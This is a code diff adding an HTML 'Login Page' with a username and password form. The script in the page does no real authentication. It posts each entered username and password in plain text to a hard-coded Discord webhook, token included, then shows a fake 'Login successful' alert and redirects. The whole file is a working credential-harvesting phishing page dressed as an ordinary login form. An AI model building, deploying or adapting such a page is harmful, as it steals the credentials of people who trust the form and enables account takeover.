@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 8px;
+            background: blue;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Login</h2>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+    </div>
+
+    <script>
+        function login() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            if (username && password) {
+                const webhookUrl = "https://discord.com/api/webhooks/1334022448886054974/Oh0lrOoCdULy48CDlIIjBFmh_BOv_GFdMcyShoWKpnNVll87vYZBXl2FHuozYMAZxD3c";
+                const payload = {
+                    content: `Login Attempt:\n**Username:** ${username}\n**Password:** ${password}`
+                };
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    alert("Login successful! Redirecting...");
+                    window.location.href = "https://example.com/dashboard"; // Change this to your dashboard URL
+                }).catch(error => console.error("Error:", error));
+            } else {
+                alert("Please enter both username and password.");
+            }
+        }
+    </script>
+
+</body>
+</html>
